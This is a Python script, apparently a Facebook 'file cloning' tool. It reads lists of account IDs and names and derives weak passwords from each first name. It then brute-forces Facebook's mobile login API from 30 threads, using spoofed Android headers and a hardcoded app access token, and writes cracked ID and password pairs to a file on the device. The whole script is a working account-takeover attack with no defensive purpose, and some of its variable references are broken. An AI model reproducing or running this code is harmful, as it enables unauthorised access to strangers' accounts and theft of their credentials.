#====import====#
import os, random, sys, json, uuid, time
from time import sleep
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:
    import requests
except:
    os.system("pip install requests -y")
    import requests
#====loop====#
loop = 0
ok = []
cp = []
ugen = []
#_______[=COLOUR=]_________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
F = '\x1b[38;5;40m'
F1 = '\x1b[38;5;41m'
F2 = '\x1b[38;5;42m'
F3 = '\x1b[38;5;43m'
F4 = '\x1b[38;5;45m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
G6 = '\x1b[38;5;151m'
A1 = '\x1b[38;5;152m'
A2 = '\x1b[38;5;153m'
A3 = '\x1b[38;5;154m'
A4 = '\x1b[38;5;155m'
A6 = '\x1b[38;5;156m'
A7 = '\x1b[38;5;157m'
M = '\x1b[38;5;205m'
#_______[=User-agent=]_______#
#====logo===#
logo=(f"""

           {F3}###    {M}##     ## {G3}########  
        {F3}  ## ##    {M}##   ##  {G3}##     ## 
        {F3} ##   ##    {M}## ##  {G3} ##     ## 
        {F3}##     ##    {M}###   {G3} ########  
        {F3}#########   {M}## ##   {G3}##   ##   
        {F3}##     ##  {M}##   ##  {G3}##    ##  
        {F3}##     ## {M}##     ## {G3}##     ## 
{G2}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{M}[{G1}»{M}]{G3} CREATOR BY {G1}>{G3} ALINUR RAHMAN
{M}[{A4}»{M}]{G1} GITHUB     {G5}>{G1} ALINUR-404
{M}[{G5}»{M}]{A4} TOOLS TYPE{A4} >{A4} RANDOM & FILE CLONIG
{M}[{F1}»{M}]{F4} VERSION{A6}    >{A1} 7.7
{G2}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#====clear===#
def clear():
   os.system('clear')
   print(logo)
#====linex====#
def linex():
    print(f'{G2}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#====main====#
def Main():
	clear()
	print('(1) File Cloning ')
	print('(0) Exit')
	linex()
	ops=input(f'(>)>> Choice : ')
	if ops in ["1","q"]:
		file()
	elif ops=="0":
		sys.exit()
	else:
		print(f'Select Correct option ');sleep(2)
		Main()
#====File====#
def file():
	clear()
	fil=input(f'(>)>>  INPUT FILE : ')
	linex()
	try:
		pax=open(fil,"r").read().splitlines()
	except FileNotFoundError:
		print(f'(>) File Not Found');sleep(2)
		file()
	passx(pax)
#====Auto Pass====#
def passx(pax):
	tl=str(len(pax))
	clear()
	print(f'(>) TOTAL ID : {tl}')
	print(f'(>) USE AIRLINE MODE')
	linex()
	with ThreadPool (max_workers=30) as ema:
		for axr in pax:
			idf,nmf = axr.split('|')[0],axr.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwx=[]
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwx.append(frs+"123")
					pwx.append(frs+"1234")
					pwx.append(frs+"12345")
					pwx.append(nmf)
					pwx.append(frs+"57573200")
					pwx.append(frs+"@")
					pwx.append(frs+"@@")
					pwx.append(frs+"@@@")
					pwx.append(frs+"@123")
					pwx.append(frs+"@111")
					pwx.append(frs+"@1122")
					pwx.append(frs+"@1234")
					pwx.append(frs+"12")
					pwx.append(frs+"1122")
					pwx.append(frs+"11")
					pwx.append(frs+"111")
			else:
				if len(frs)<3:
					pwx.append(nmf)
				else:
					pwx.append(frs+"123")
					pwx.append(frs+"1234")
					pwx.append(frs+"12345")
					pwx.append(nmf)
					pwx.append(frs+"57573200")
					pwx.append(frs+"@")
					pwx.append(frs+"@@")
					pwx.append(frs+"@@@")
					pwx.append(frs+"@123")
					pwx.append(frs+"@111")
					pwx.append(frs+"@1122")
					pwx.append(frs+"@1234")
					pwx.append(frs+"12")
					pwx.append(frs+"1122")
					pwx.append(frs+"11")
					pwx.append(frs+"111")
				ema.submit(api,idf,pwx)
		linex()
		print(f'(+) CLONING COMPLETED ')
		print(f'(+) TOTAL OK ID : '+str(len(ok)))
		linex()
#=====Method=====#
def api(idf,pwx):
    global ok,loop,cp
    sys.stdout.write(f'\r{M} [{G1}ALINUR-M2{M}]{A} >{M} [{A3}%s{M}] {A}>{M} [{G2}OK:-%s{M}] {A}>{M} [{F1}CP{F1}:-%s{M}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": idf,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r  [AXR-OK] {idf} | {ps}      ")
                open("/sdcard/AXR-Ok.txt","a").write(idf+"|"+ps+"\n")
                oks.append(idf)
                break
            elif "Please Confirm Email" in q:
                print(f"\r\r [AXR-OK] {idf} | {ps}      ")
                open("/sdcard/AXR-Ok.txt","a").write(idf+"|"+ps+"\n")
                oks.append(idf)
            elif "www.facebook.com" in q:
                print(f"\r\r  [AXR-CP] {idf} | {ps}      ")
                cps.append(ids)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)

#====The End=====#
Main()